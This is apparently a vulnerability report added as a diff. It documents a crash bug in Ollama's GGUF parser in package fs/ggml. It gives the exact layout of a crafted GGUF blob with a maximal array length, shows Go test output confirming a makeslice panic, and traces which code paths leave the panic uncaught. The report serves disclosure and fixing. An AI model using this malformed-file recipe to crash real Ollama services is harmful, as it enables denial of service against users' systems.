@@ -1,0 +1,33 @@
+Environment: Darwin arm64, Go unit-test harness against package github.com/ollama/ollama/fs/ggml
+Commit: main @ 57653b8e (HEAD at review time)
+
+=== Crafted GGUF blob ===
+magic:          "GGUF"
+version:        3
+num_tensors:    0
+num_kv:         1
+kv[0].key:      "bad" (uint64 length prefix)
+kv[0].type:     ggufTypeArray (9)
+kv[0].subtype:  ggufTypeUint8 (0)
+kv[0].length:   0xFFFFFFFFFFFFFFFF  <-- attacker-controlled
+
+=== Test output ===
+$ go test ./fs/ggml/ -run TestGGUFLengthTruncationPanic -v
+=== RUN   TestGGUFLengthTruncationPanic
+bits = 64
+GOARCH = arm64
+PANIC RECOVERED: runtime error: makeslice: len out of range
+    gguf_poc_test.go:54: confirmed: panic reached via decode, message=runtime error: makeslice: len out of range
+--- PASS: TestGGUFLengthTruncationPanic (0.00s)
+PASS
+ok   github.com/ollama/ollama/fs/ggml   0.690s
+
+=== Analysis ===
+fs/ggml/gguf.go:430  n, _ := readGGUF[uint64]        -> n = 0xFFFFFFFFFFFFFFFF
+fs/ggml/gguf.go:437  newArray[uint8](int(n), -1)     -> size = -1 (two's complement wrap on 64-bit int)
+fs/ggml/gguf.go:418  if maxSize < 0 ...              -> maxSize = -1 (from ggml.Decode(rs, -1) callers)
+                                                        gate passes unconditionally
+fs/ggml/gguf.go:419  a.values = make([]uint8, -1)    -> runtime.makeslice panic
+
+Panic recovered by gin.Recovery on HTTP paths (gin.Default() at server/routes.go:1674).
+Panic propagates uncaught in runner subprocess paths (ml/backend/ggml/ggml.go:130 fsggml.Decode(r,-1)).
